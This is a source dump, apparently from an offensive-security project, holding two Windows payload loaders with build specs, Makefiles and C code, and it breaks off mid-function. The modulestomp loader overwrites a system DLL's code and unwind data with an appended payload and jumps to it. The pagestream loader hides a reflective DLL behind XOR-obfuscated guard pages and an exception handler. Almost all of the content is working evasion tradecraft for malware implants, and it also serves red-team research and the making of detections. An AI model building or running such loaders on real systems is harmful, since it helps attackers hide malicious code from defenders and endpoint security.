#pragma intrinsic( _rotr )
#endif

DWORD ror13hash(const char * c ) {
	register DWORD h = 0;
	do {
		h = _rotr( h, 13 );
		h += *c;
	} while( *++c );

	return h;
}

```

## File: modulestomp/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: modulestomp/loader.spec

```text
#
# Simple COFF Loader build spec
#

x86:
	# load our x86 .o file AND turn it into position-independent code
	load "bin/loader.x86.o"
		# +gofirst moves go() to position 0 of our PIC
		# +optimize is our link-time optimizer, gets rid of unused functions
		make pic +gofirst +optimize

		# bring in PIC services (e.g., dfr, fixbss, fixptrs, etc.)
		run "../simple_pic/services.spec"

		# merge the Tradecraft Garden Library into our PIC
		mergelib "../libtcg/libtcg.x86.zip"

		# load our Reflective DLL argument AND link it into our PIC as my_data section
		push $OBJECT
			make object +optimize
			export
			link "my_data"

		# this is OPTIONAL, it will dump the disassembled loader.x86.o to out.txt
		disassemble "out.txt"
	
	# we're done, export the final blob
	export

x64:
	load "bin/loader.x64.o"
		make pic +gofirst +optimize

		run "../simple_pic/services.spec"
		mergelib "../libtcg/libtcg.x64.zip"

		push $OBJECT
			make object +optimize +unwind
			export
			link "my_data"

		export

```

## File: modulestomp/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/loader.c -o bin/loader.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/loader.c -o bin/loader.x64.o

clean:
	rm -rf bin

```

## File: modulestomp/src/loader.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryExW (LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlags);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualProtect (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __BOFDATA__[0] __attribute__((section("my_data")));

char * findAppendedPICO() {
	return (char *)&__BOFDATA__;
}

/*
 * Walk a DLL looking for a section with specific characteristics
 */
#define FLAG(x, y) ( ((x) & (y)) == (y) )

char * findSection(DLLDATA * data, int flags, int minSize, DWORD * size) {
	DWORD                   numberOfSections;
	IMAGE_SECTION_HEADER  * sectionHdr       = NULL;

	/* loop through our sections */
	numberOfSections = data->NtHeaders->FileHeader.NumberOfSections;
	sectionHdr       = (IMAGE_SECTION_HEADER *)PTR_OFFSET(data->OptionalHeader, data->NtHeaders->FileHeader.SizeOfOptionalHeader);
	for (int x = 0; (x + 1) < numberOfSections; x++) {
		if (FLAG(sectionHdr->Characteristics, flags) && sectionHdr->SizeOfRawData >= minSize) {
			if (size != NULL)
				*size = sectionHdr->SizeOfRawData;

			return (char *)data->DosHeader + sectionHdr->VirtualAddress;
		}

		sectionHdr++;
	}

	return NULL;
}

/*
 * Get the PDATA section out of a DLL
 */
char * FindPDATA(DLLDATA* data, DWORD * size) {
	IMAGE_DATA_DIRECTORY exceptionDir = data->OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];

	if (size != NULL)
		*size = exceptionDir.Size;

	return (char *)data->DosHeader + exceptionDir.VirtualAddress;
}

/*
 * Copy our RUNTIME_INFORMATION elsewhere, update its relative addresses factoring new location/new base address.
 */
#ifdef WIN_X64
void RelocateAndFix(_RESOURCE * src, char * dst, char * oldBase, char * newBase) {
	/* calculate the difference between our object code base address and the new base address */
	DWORD baseDiff  = (ULONG_PTR)oldBase - (ULONG_PTR)newBase;

	/* setup our src/dst pairs */
	PRUNTIME_FUNCTION rt_dst = (PRUNTIME_FUNCTION)dst;
	PRUNTIME_FUNCTION rt_src = (PRUNTIME_FUNCTION)src->value;

	DWORD count = src->length / sizeof(RUNTIME_FUNCTION);

	/* stomp over the existing .pdata. It's important our block of RUNTIME_FUNCTIONs are sorted inline with
	 * the others. Here, we're taking a chance that our RUNTIME_FUNCTION block ends in a way that's sorted
	 * compared to the other entries. */
	for (int x = 0; x < count; x++) {
		rt_dst->BeginAddress = rt_src->BeginAddress + baseDiff;
		rt_dst->EndAddress   = rt_src->EndAddress + baseDiff;
		rt_dst->UnwindData   = rt_src->UnwindData + baseDiff;
		rt_dst++;
		rt_src++;
	}
}
#endif

/*
 * Our PICO loader, have fun, go nuts!
 */
WINBASEAPI HANDLE WINAPI KERNEL32$CreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject (HANDLE hHandle, DWORD dwMilliseconds);

void go() {
	char *      src;
	DLLDATA     parser;
	IMPORTFUNCS funcs;

	DWORD       oldProt;
	DWORD       szText;

	/* find our DLL appended to this PIC */
	src = findAppendedPICO();

	/* load and parse our stomp DLL */
	HMODULE hModule = KERNEL32$LoadLibraryExW(L"c:\\windows\\system32\\xpsservices.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
	ParseDLL((char *)hModule, &parser);

	/* find our .text and .data sections (let's hope they're big enough) */
	char * code = findSection(&parser, IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE, PicoCodeSize(src), &szText);
	char * data = findSection(&parser, IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE,   PicoDataSize(src), NULL);

	if (code == NULL || data == NULL) {
		dprintf("Can't find appropriate section(s) for PICO data");
		return;
	}

	/* setup our IMPORTFUNCS data structure */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/* let's make our .text section R/W so we can put our PICO over it */
	KERNEL32$VirtualProtect(code, szText, PAGE_READWRITE, &oldProt);

	/* load our pico into our destination address, thanks! */
	PicoLoad(&funcs, src, code, data);

	/* restore our .text section permissions */
	KERNEL32$VirtualProtect(code, szText, PAGE_EXECUTE_READ, &oldProt);

#ifdef WIN_X64
	/* let's find our .pdata section in the stomp DLL */
	DWORD  psize  = 0;
	char * pdata  = FindPDATA(&parser, &psize);

	/* grab our unwind data from the PICO headers and calculate its size when relocated */
	_RESOURCE * unwind = (_RESOURCE *)PicoGetUnwindData(src, code);

	/* check that we're all good */
	if (pdata != NULL && unwind != NULL && unwind->length <= psize) {
		/* change permissions and stomp our unwind data over the pdata we found */
		DWORD oldProt;
		KERNEL32$VirtualProtect(pdata, psize, PAGE_READWRITE, &oldProt);
		RelocateAndFix(unwind, pdata, code, (char *)hModule);
		KERNEL32$VirtualProtect(pdata, psize, PAGE_READONLY, &oldProt);
	}
#endif

	/* execute our PICO. We're using __transfer to tear down this stack frame and JMP
	   to the PicoEntryPoint... which keeps go() out of the call stack (x64). For x86,
	   we're just creating a new thread and waiting for it to complete. */
#ifdef WIN_X64
	__transfer((TRANSFERFUNC)PicoEntryPoint(src, code));
#else
	KERNEL32$WaitForSingleObject(KERNEL32$CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PicoEntryPoint(src, code), NULL, 0, NULL), -1);
#endif
}

```

## File: modulestomp/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: pagestream/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: pagestream/loader.spec

```text
# some meta-info about our capability
name      "PageStream rDLL"
describe  "Use VEHs and guard pages to limit DLL visibility in eXecutable memory"
author    "Adversary Fan Fiction Writers Guild"
license   "BSD"
reference "https://tradecraftgarden.org/pagestream.html"

defraw    "$DLL" "DLL capability"

x86:
	# load our x86 .o file AND turn it into position-independent code
	load "bin/loader.x86.o"
		# +gofirst moves go() to position 0 of our PIC
		make pic +gofirst +optimize

		# bring in PIC Service Module from another project
		run "../simple_pic/services.spec"

		# merge the Tradecraft Garden Library into our PIC
		mergelib "../libtcg/libtcg.x86.zip"

		# generate a 16b XOR key for our obfuscated pages
		generate $KEY 16

		# load our guardexec() PICO
		load "bin/guardexec.x86.o"
			make object +optimize

			# merge the Tradecraft Garden Library into our PICO, +optimize means we're
			# only keeping the functions we use, so it's all right
			mergelib "../libtcg/libtcg.x86.zip"

			# patch that key into our PICO
			patch "_xorkey" $KEY

			# provide a rule hint to our -g yara generator with name, max rules, min agreement
			rule "TCG_GuardExec" 8 5

			# load in the go and setup functions for a VEH-form guardexec
			load "bin/ge_veh.x86.o"
				merge

			# export the setup function in ge_veh
			exportfunc "_setup" "___tag_setup"

			export
			link "my_guardexec"
	
		# load our Reflective DLL argument AND link it into our PICO as my_data section.
		push $DLL
			link "my_data"

		# opt out the loader component from rule generation. It's not as interesting and LibTCG rules
		# cover it better.
		rule "" 0

		# we're done, export the final blob
		export

x64:
	load "bin/loader.x64.o"
		make pic +gofirst +optimize

		run "../simple_pic/services.spec"
		mergelib "../libtcg/libtcg.x64.zip"

		generate $KEY 16

		load "bin/guardexec.x64.o"
			make object +optimize
			mergelib "../libtcg/libtcg.x64.zip"
			patch "xorkey" $KEY
			rule "TCG_GuardExec" 8 5

			load "bin/ge_veh.x64.o"
				merge
			exportfunc "setup" "__tag_setup"

			export
			link "my_guardexec"

		push $DLL
			link "my_data"

		rule "" 0

		export

```

## File: pagestream/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/loader.c -o bin/loader.x86.o
	$(CC) -DWIN_X86 $(CFLAGS) -c src/guardexec.c -o bin/guardexec.x86.o
	$(CC) -DWIN_X86 $(CFLAGS) -c src/ge_veh.c -o bin/ge_veh.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/loader.c -o bin/loader.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/guardexec.c -o bin/guardexec.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/ge_veh.c -o bin/ge_veh.x64.o

clean:
	rm -rf bin

```

## File: pagestream/src/ge_veh.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI PVOID WINAPI KERNEL32$AddVectoredExceptionHandler (ULONG First, PVECTORED_EXCEPTION_HANDLER Handler);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualFree (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
WINBASEAPI DECLSPEC_NORETURN VOID WINAPI KERNEL32$ExitThread (DWORD dwExitCode);

#define memset(x, y, z) __stosb((unsigned char *)x, y, z);
#define memcpy(x, y, z) __movsb((unsigned char *)x, (unsigned char *)y, z);

void        GuardExecInit();
LONG WINAPI GuardExecVEHHandler(EXCEPTION_POINTERS * pExceptionPointers);
void        GuardSections(DLLDATA * dll, char * dst, char * src);

/* globals we need for our free and run step */
char * loader;
char * dllEntry;
char * dllBase;

/* Set our guard exec shit up (exported function) */
void setup(char * _loader, DLLDATA * data, char * dstdll) {
	/* get our DLL size */
	int len = SizeOfDLL(data);

	/* initialize our GuardExec module */
	GuardExecInit();

	/* allocate our memory where our obfuscated, ready to restore, payload content will live */
	char * streamsrc = (char *)KERNEL32$VirtualAlloc( NULL, len, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );

	/* copy our payload content over to it! */
	memcpy(streamsrc, dstdll, len);

	/* set all of our sections to NULL, for now */
	memset(dstdll, 0, len);

	/* Now, we will walk the DLL, section by section, and setup guard regions and hints in our
	 * global table keeping track of these things */
	GuardSections(data, dstdll, streamsrc);

	/* install the handler as our global VEH */
	KERNEL32$AddVectoredExceptionHandler(FALSE, (PVECTORED_EXCEPTION_HANDLER)GuardExecVEHHandler);

	/* set some of our globals */
	dllEntry = (char *)EntryPoint(data, dstdll);
	dllBase  = dstdll;
	loader   = _loader;
}

void go() {
	/* free our loader */
	KERNEL32$VirtualFree(loader, 0, MEM_RELEASE);

	/* call the entry point of our Reflective DLL */
	((DLLMAIN_FUNC)dllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, NULL);

	/* exit the current thread.. else... we return to our free'd() memory and we don't want that. */
	KERNEL32$ExitThread(0);
}

```

## File: pagestream/src/guardexec.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI PVOID WINAPI KERNEL32$AddVectoredExceptionHandler (ULONG First, PVECTORED_EXCEPTION_HANDLER Handler);
WINBASEAPI WINBOOL WINAPI KERNEL32$FlushInstructionCache (HANDLE hProcess, LPCVOID lpBaseAddress, SIZE_T dwSize);
WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentThreadId (VOID);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualProtect (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
WINBASEAPI DECLSPEC_NORETURN VOID WINAPI KERNEL32$ExitThread (DWORD dwExitCode);

#define memset(x, y, z) __stosb((unsigned char *)x, y, z);
#define memcpy(x, y, z) __movsb((unsigned char *)x, (unsigned char *)y, z);

#define MAXVISIBLE 3
#define MAXREGIONS 16

typedef struct {
	ULONG_PTR   start;
	ULONG_PTR   end;
	DWORD       permissions;
	char      * source;
} GUARDREGION;

typedef struct {
	char      * pages[MAXVISIBLE];
	int         index;
} REGIONQUEUE;

GUARDREGION regions[MAXREGIONS];
REGIONQUEUE state;

#define OLDESTPAGE() state.pages[state.index % MAXVISIBLE]

/* track our guard pages */
void TrackPage(ULONG_PTR page) {
	DWORD oldProt;

	if (OLDESTPAGE() != NULL) {
		dprintf("drop  page %p", OLDESTPAGE());
		KERNEL32$VirtualProtect(OLDESTPAGE(), 0x1000, PAGE_READWRITE, &oldProt);
		memset(OLDESTPAGE(), 0, 0x1000);
		KERNEL32$VirtualProtect(OLDESTPAGE(), 0x1000, PAGE_READWRITE | PAGE_GUARD, &oldProt);
	}

	OLDESTPAGE() = (char *)page;
	//dprintf("ADD   %p at index %d", OLDESTPAGE(), state.index);

	state.index = (state.index + 1) % MAXVISIBLE;
}

/* add a region to guard! */
void AddGuardRegion(char * payload, int len, char * src, DWORD permissions) {
	for (int x = 0; x < MAXREGIONS; x++) {
